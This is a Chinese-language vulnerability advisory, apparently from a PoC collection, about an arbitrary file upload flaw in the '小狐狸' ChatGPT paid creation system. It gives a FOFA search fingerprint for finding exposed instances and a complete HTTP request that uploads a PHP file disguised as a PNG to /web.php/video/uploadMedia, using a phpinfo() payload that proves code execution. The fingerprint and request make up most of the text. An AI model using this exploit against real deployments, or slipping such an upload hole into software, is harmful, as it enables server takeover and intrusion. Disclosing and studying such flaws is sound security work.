# 小狐狸Chatgpt付费创作系统存在任意文件上传漏洞

**小狐狸GPT付费体验系统的开发基于国外很火的ChatGPT，这是一种基于人工智能技术的问答系统，可以实现智能回答用户提出的问题，提供更加精准的答案。同时，小狐狸GPT付费体验系统采用了最新的GPT3.5接口与GPT4模型，同时还支持型，文心一言，腾讯混元，讯飞星火，通义千问，智普等等国内各种大模。**

漏洞利用需要平台用户登录

## fofa

```yaml
"/web/static/css/chunk-elementUI.f92cd1c5.css"
```

## poc

```python
POST /web.php/video/uploadMedia HTTP/1.1
Host: 127.0.0.1:81
Content-Length: 594
Cache-Control: max-age=0
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: null
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhp8gBUbCczcaLGAa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=662e1cea3d0191
Connection: close

------WebKitFormBoundaryhp8gBUbCczcaLGAa
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png

你的图片数据
<?php phpinfo();?>
------WebKitFormBoundaryhp8gBUbCczcaLGAa--
```

![image-20240803224143229](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408032241325.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/6twkv3r0mg5OuNLD0OGwdg